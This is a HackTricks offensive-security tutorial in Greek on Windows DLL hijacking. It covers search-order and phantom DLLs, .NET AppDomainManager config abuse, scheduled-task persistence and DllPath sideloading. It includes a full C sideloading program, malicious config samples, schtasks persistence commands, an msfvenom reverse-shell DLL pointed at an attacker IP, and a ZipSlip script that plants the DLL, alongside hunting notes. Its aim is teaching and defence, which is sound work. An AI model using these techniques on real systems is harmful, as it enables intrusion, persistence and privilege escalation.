# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός περιλαμβάνει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρότι εδώ η έμφαση είναι στο escalation, η μέθοδος του hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Για το DLL hijacking χρησιμοποιούνται διάφορες μέθοδοι, καθεμία από τις οποίες έχει διαφορετική αποτελεσματικότητα, ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying για τη διατήρηση της λειτουργικότητας του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που θα φορτώσει μια εφαρμογή, θεωρώντας ότι πρόκειται για ένα απαιτούμενο DLL το οποίο δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης, όπως τα `%PATH%` ή τα αρχεία `.exe.manifest` / `.exe.local`, ώστε η εφαρμογή να κατευθύνεται στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο που ελέγχεται από τον χρήστη, μαζί με την αντιγραμμένη εφαρμογή, με τρόπο παρόμοιο με τις τεχνικές Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να κάνει μια αξιόπιστη διεργασία **.NET Framework** να φορτώσει κώδικα του attacker. Αν το εκτελέσιμο αρχείο-στόχος είναι μια **managed** εφαρμογή, το CLR συμβουλεύεται επίσης ένα **application configuration file** με όνομα που βασίζεται στο εκτελέσιμο αρχείο (για παράδειγμα `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα προσαρμοσμένο **AppDomainManager**. Αν το config δείχνει σε ένα assembly που ελέγχεται από τον attacker και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη διαδρομή κώδικα της εφαρμογής** και το εκτελεί μέσα στην αξιόπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το schema διαμόρφωσης του .NET Framework της Microsoft, πρέπει να υπάρχουν τόσο τα `<appDomainManagerAssembly>` όσο και τα `<appDomainManagerType>` για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Ελάχιστο config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Ελάχιστος διαχειριστής:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Πρακτικές σημειώσεις:
- Αυτό είναι tradecraft ειδικά για **.NET Framework**. Βασίζεται στην ανάλυση config από το CLR και όχι στη σειρά αναζήτησης DLL του Win32.
- Ο host πρέπει να είναι πραγματικά ένα **managed EXE**. Γρήγορος έλεγχος: `sigcheck -m target.exe`, `corflags target.exe` ή έλεγχος για το **CLR Runtime Header** στα PE metadata.
- Το όνομα του config πρέπει να ταιριάζει ακριβώς με το όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **signed Microsoft/vendor binaries**, επειδή το trusted EXE παραμένει ανέπαφο, ενώ το malicious managed assembly εκτελείται in-process.
- Αν έχετε ήδη έναν εγγράψιμο installer/update directory, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **first stage**, και στη συνέχεια να ακολουθήσει classic DLL sideloading ή reflective loading για τα επόμενα στάδια.

### Το AppDomainManager ως downloader + bootstrap για scheduled task

Ένα πρακτικό intrusion pattern είναι ο συνδυασμός του trusted managed EXE με ένα malicious `*.config` και ένα malicious AppDomainManager DLL που λειτουργεί μόνο ως **μικρό bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί έναν signed .NET installer ή updater από μια αξιόπιστη τοποθεσία, όπως `%USERPROFILE%\Downloads`.
2. Το adjacent config προκαλεί τη φόρτωση του attacker assembly από το CLR **πριν** ξεκινήσει η legitimate app logic.
3. Ο malicious manager εκτελεί ένα **path gate** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει στο second stage να εκτελεστεί μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το real payload σε μια τοποθεσία εγγράψιμη από τον χρήστη, όπως `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το signed host EXE παραμένει αμετάβλητο, επομένως το triage που ελέγχει μόνο τα hashes του main binary μπορεί να μην εντοπίσει το compromise.
- Το απλό **path-based anti-analysis** είναι συνηθισμένο: η μετακίνηση του ZIP/EXE/DLL triad στο Desktop, στο Temp ή σε path sandbox μπορεί σκόπιμα να διακόψει την αλυσίδα.
- Το first-stage AppDomainManager DLL μπορεί να παραμείνει μικρό και low-noise, ενώ το real implant γίνεται fetch αργότερα.

Ελάχιστο παράδειγμα persistence που συναντάται συχνά με αυτό το pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Σημειώσεις:
- Το ` /rl highest` σημαίνει **υψηλότερο διαθέσιμο** για τον συγκεκριμένο χρήστη/συνεδρία· από μόνο του δεν εγγυάται κλιμάκωση σε SYSTEM.
- Αυτή η τεχνική συχνά κατηγοριοποιείται καλύτερα ως **execution/persistence via .NET config abuse** παρά ως κλασικό missing-DLL search-order hijacking, παρόλο που οι operators συχνά συνδυάζουν και τα δύο.

Σημεία ανίχνευσης:
- Υπογεγραμμένα .NET executables που εκτελούνται από **ZIP extraction paths**, `Downloads`, `%TEMP%` ή άλλους φακέλους στους οποίους μπορεί να γράψει ο χρήστης, μαζί με ένα **colocated** `<exe>.config`.
- Νέα scheduled tasks των οποίων η ενέργεια δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads`, με ονόματα που μιμούνται browser/vendor updaters.
- Βραχύβιες managed bootstrap processes που κατεβάζουν αμέσως ένα άλλο EXE και στη συνέχεια εκκινούν το `schtasks.exe`.
- Samples που τερματίζουν νωρίς, εκτός αν η διαδρομή του executable αντιστοιχεί σε αναμενόμενο user-profile directory.

### Hijacking ενός υπάρχοντος scheduled task για επανεκκίνηση του sideload chain

Για persistence, μην αναζητάτε μόνο **τη δημιουργία νέου task**. Ορισμένα intrusion sets περιμένουν μέχρι ένας legitimate installer να δημιουργήσει ένα **normal updater task** και στη συνέχεια **ξαναγράφουν την ενέργεια του task**, ώστε το υπάρχον όνομα, ο author και το trigger να παραμένουν οικεία στους defenders.

Reusable workflow:
1. Εγκαταστήστε/εκτελέστε το legitimate software και εντοπίστε το task που δημιουργεί κανονικά.
2. Εξαγάγετε το task XML και σημειώστε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο την ενέργεια, ώστε το task να εκκινεί το **trusted host EXE** από έναν user-writable staging directory, το οποίο στη συνέχεια κάνει side-load ή AppDomain-load το πραγματικό payload.
4. Καταχωρίστε ξανά το ίδιο όνομα task αντί να δημιουργήσετε ένα νέο προφανές persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Γιατί είναι πιο stealth:
- Το όνομα του task μπορεί να εξακολουθεί να φαίνεται νόμιμο (για παράδειγμα, ένας vendor updater).
- Η **Task Scheduler service** το εκκινεί, επομένως η επικύρωση parent/ancestor συχνά βλέπει την αναμενόμενη αλυσίδα scheduling αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα task names** μπορεί να παραβλέψουν ένα task του οποίου η registration υπήρχε ήδη, αλλά το action του δείχνει πλέον στο `%LOCALAPPDATA%`, `%APPDATA%` ή σε άλλη controlled από τον attacker διαδρομή.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Συγκρίνετε τα XML των `C:\Windows\System32\Tasks\*` και τα metadata του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με ένα baseline.
- Δημιουργήστε alert όταν ένα **vendor-looking updater task** εκτελείται από **user-writable directories** ή εκκινεί ένα .NET EXE με colocated αρχείο `*.config`.

> [!TIP]
> Για μια step-by-step αλυσίδα που συνδυάζει HTML staging, AES-CTR configs και .NET implants πάνω από DLL sideloading, δείτε το παρακάτω workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εντοπισμός missing DLLs

Ο πιο συνηθισμένος τρόπος για να εντοπίσετε missing Dlls σε ένα σύστημα είναι να εκτελέσετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από τα sysinternals, **ορίζοντας** τα **ακόλουθα 2 filters**:

![Common Techniques - Εντοπισμός missing Dlls: Ο πιο συνηθισμένος τρόπος για να εντοπίσετε missing Dlls σε ένα σύστημα είναι να εκτελέσετε το procmon από τα sysinternals, ορίζοντας τα ακόλουθα 2 filters](<../../../images/image (961).png>)

![Common Techniques - Εντοπισμός missing Dlls: Ο πιο συνηθισμένος τρόπος για να εντοπίσετε missing Dlls σε ένα σύστημα είναι να εκτελέσετε το procmon από τα sysinternals, ορίζοντας τα ακόλουθα 2 filters](<../../../images/image (230).png>)

και απλώς να εμφανίσετε το **File System Activity**:

![Common Techniques - Εντοπισμός missing Dlls: και απλώς να εμφανίσετε το File System Activity](<../../../images/image (153).png>)

Αν αναζητάτε **missing dlls γενικά**, **αφήστε** αυτό να εκτελείται για μερικά **seconds**.\
Αν αναζητάτε ένα **missing DLL μέσα σε συγκεκριμένο executable**, ορίστε ένα ακόμη filter, όπως **"Process Name" "contains" `<exec name>`**, εκτελέστε το και σταματήστε την καταγραφή events.<sup>[[9]](#references)</sup>

## Εκμετάλλευση Missing DLLs

Για να κάνετε privilege escalation, αναζητήστε ένα **DLL που μια privileged process προσπαθεί να φορτώσει** από μια τοποθεσία στην οποία μπορείτε να κάνετε write. Αυτό μπορεί να συμβεί όταν ελέγχετε έναν directory που αναζητείται πριν από τον directory που περιέχει το legitimate DLL ή όταν το requested DLL δεν υπάρχει και μπορείτε να κάνετε write σε έναν από τους searched directories.

### Dll Search Order

**Στο** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows applications** αναζητούν DLLs ακολουθώντας ένα σύνολο από **pre-defined search paths**, σύμφωνα με μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα harmful DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους directories, διασφαλίζοντας ότι θα φορτωθεί πριν από το authentic DLL. Μια λύση για την αποτροπή αυτού είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείτε να δείτε παρακάτω το **DLL search order σε 32-bit** systems:

1. Ο directory από τον οποίο φόρτωσε η εφαρμογή.
2. Ο system directory. Χρησιμοποιήστε τη function [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε το path αυτού του directory.(_C:\Windows\System32_)
3. Ο 16-bit system directory. Δεν υπάρχει function που να λαμβάνει το path αυτού του directory, αλλά πραγματοποιείται αναζήτηση σε αυτόν. (_C:\Windows\System_)
4. Ο Windows directory. Χρησιμοποιήστε τη function [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε το path αυτού του directory.
1. (_C:\Windows_)
5. Ο current directory.
6. Οι directories που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει το per-application path που καθορίζεται από το registry key **App Paths**. Το key **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό του DLL search path.

Αυτό είναι το **default** search order με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτήν τη λειτουργία, δημιουργήστε το registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε το σε 0 (η προεπιλογή είναι enabled).

Αν η function [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά στον directory του executable module που φορτώνει το **LoadLibraryEx**.

Τέλος, ένα DLL μπορεί να φορτωθεί με absolute path αντί για name. Σε αυτήν την περίπτωση, τα Windows εξετάζουν μόνο αυτό το path για το ίδιο το DLL· οι dependencies που ζητούνται με name εξακολουθούν να ακολουθούν το ισχύον search order.

Υπάρχουν και άλλοι τρόποι αλλαγής του search order, αλλά δεν πρόκειται να τους εξηγήσω εδώ.

### Chaining ενός arbitrary file write σε missing-DLL hijack

**Related technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Χρησιμοποιήστε **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξετε τα DLL names που κάνει probe η process αλλά δεν μπορεί να βρει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται βάσει **schedule/service**, η τοποθέτηση ενός DLL με ένα από αυτά τα names στον **application directory** (search-order entry #1) θα το φορτώσει στην επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, η process αναζητούσε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιουργήστε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σας είναι ένα **ZipSlip-style arbitrary write**, δημιουργήστε ένα ZIP του οποίου το entry διαφεύγει από το extraction dir, ώστε το DLL να καταλήξει στον app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το archive στο monitored inbox/share· όταν η scheduled task επανεκκινήσει τη διεργασία, αυτή φορτώνει το malicious DLL και εκτελεί τον κώδικά σας ως ο λογαριασμός υπηρεσίας.

### Εξαναγκασμός sideloading μέσω του RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε deterministically το DLL search path μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τα native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο που ελέγχεται από τον attacker, μια target διεργασία που επιλύει ένα imported DLL βάσει ονόματος (χωρίς absolute path και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να εξαναγκαστεί να φορτώσει ένα malicious DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις process parameters με το RtlCreateProcessParametersEx και δώστε ένα custom DllPath που δείχνει στον controlled φάκελό σας (π.χ. τον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το target binary επιλύει ένα DLL βάσει ονόματος, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας reliable sideloading ακόμη και όταν το malicious DLL δεν βρίσκεται στον ίδιο κατάλογο με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη child διεργασία που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την current διεργασία.
- Το target πρέπει να κάνει import ή LoadLibrary ενός DLL βάσει ονόματος (χωρίς absolute path και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα hardcoded absolute paths δεν μπορούν να γίνουν hijack. Τα forwarded exports και το SxS ενδέχεται να αλλάξουν την precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα Operational usage
- Τοποθετήστε ένα malicious xmllite.dll (που εξάγει τις απαιτούμενες functions ή κάνει proxy στη real one) στον κατάλογο DllPath.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll βάσει ονόματος, χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και κάνει sideload το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να χρησιμοποιείται για τη δημιουργία multi-stage sideloading chains: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με custom DllPath, ώστε να εξαναγκάσει τη φόρτωση του DLL του attacker από έναν staging directory.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking μέσω `.exe.config`

Για targets **.NET Framework**, το sideloading μπορεί να γίνει **πριν από τη `Main()`** χωρίς patching της memory, μέσω abuse του adjacent **`.exe.config`** file της εφαρμογής. Αντί να βασίζεται μόνο στη Win32 DLL search order, ο attacker τοποθετεί ένα legitimate .NET EXE δίπλα σε ένα malicious config και ένα ή περισσότερα attacker-controlled assemblies.

Πώς λειτουργεί το chain:<sup>[[15]](#references)[[22]](#references)</sup>
1. Το host EXE ξεκινά και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να κάνει instantiate ένα attacker-controlled `AppDomainManager`.
3. Ο malicious manager αποκτά **pre-`Main()` execution** μέσα στη trusted host process.
4. Το ίδιο config μπορεί να αναγκάσει το CLR να κάνει resolve πρώτα τα local assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και μπορεί να αποδυναμώσει το runtime validation/telemetry χωρίς inline patching.

Μοτίβο τύπου campaign (η ακριβής nesting μπορεί να διαφέρει ανά directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Γιατί είναι χρήσιμο:
- **`<probing privatePath="."/>`** διατηρεί την επίλυση των assemblies στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε attacker code κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η λογική της νόμιμης εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια full-trust εφαρμογή να φορτώσει unsigned ή τροποποιημένα assemblies χωρίς αποτυχία επικύρωσης strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** αποφεύγει τις ανακατευθύνσεις publisher-policy σε νεότερα assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** κάνει την επιλογή runtime πιο deterministic.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα μέσω ETW** από το configuration, αντί το implant να κάνει patch το `EtwEventWrite` στη μνήμη.

Operational pattern που παρατηρήθηκε σε πρόσφατες campaigns:
- Το Stage 1 ρίχνει τα `setup.exe`, `setup.exe.config` και local assemblies.
- Το Stage 2 τα αντιγράφει σε έναν πειστικό φάκελο **AppData update**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω **scheduled task**.
- Το Stage 3 επαληθεύει το execution context, για παράδειγμα τον αναμενόμενο parent `svchost.exe` από το Task Scheduler, πριν φορτώσει το τελικό RAT DLL/export.

Hunting ideas:
- Υπογεγραμμένα ή κατά τα άλλα νόμιμα **.NET executables** που εκτελούνται μαζί με ύποπτα γειτονικά αρχεία **`.config`** σε τοποθεσίες όπου μπορούν να γράψουν οι χρήστες.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
- Scheduled tasks που επανεκκινούν μετονομασμένα update binaries από το **`%LOCALAPPDATA%`** ή από app-specific καταλόγους `\bin\update\`.
- Parent/child chains όπου ένα scheduled task εκκινεί ένα trusted .NET host, το οποίο φορτώνει αμέσως non-vendor assemblies από τον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL σύμφωνα με την τεκμηρίωση των Windows

Ορισμένες εξαιρέσεις από την τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν εντοπιστεί ένα **DLL που έχει το ίδιο όνομα με ένα DLL που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντί αυτού, ελέγχει πρώτα για redirection και manifest, πριν χρησιμοποιήσει το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Όταν το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί την έκδοσή του για το known DLL, μαζί με τυχόν dependent DLLs, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει λίστα με αυτά τα known DLLs.
- Αν ένα **DLL έχει dependencies**, η αναζήτηση για αυτά τα dependent DLLs πραγματοποιείται σαν να καθορίζονταν μόνο από τα **module names** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω full path.

### Escalating Privileges

**Requirements**:

- Εντοπίστε μια διεργασία που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά privileges** (οριζόντια ή lateral movement) και από την οποία **λείπει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** σε οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Η τοποθεσία μπορεί να είναι ο κατάλογος του executable ή ένας κατάλογος μέσα στο system path.

Αυτές οι προϋποθέσεις δεν είναι συνήθως διαθέσιμες από προεπιλογή: τα privileged executables συνήθως δεν έχουν missing DLL dependencies και οι standard users κανονικά δεν μπορούν να γράψουν σε καταλόγους του system search path. Τα misconfigured περιβάλλοντα μπορούν, ωστόσο, να εκθέσουν και τις δύο συνθήκες.\
Αν πληρούνται οι requirements, ελέγξτε το project [UACME](https://github.com/hfiref0x/UACME). Παρότι ο κύριος στόχος του είναι το UAC bypass, περιέχει DLL-hijacking PoCs για συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον writable κατάλογο που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα permissions σε έναν φάκελο** εκτελώντας:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **καταχραστείτε το DLL Hijacking για κλιμάκωση προνομίων** με δικαιώματα εγγραφής σε έναν φάκελο **System Path**, δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

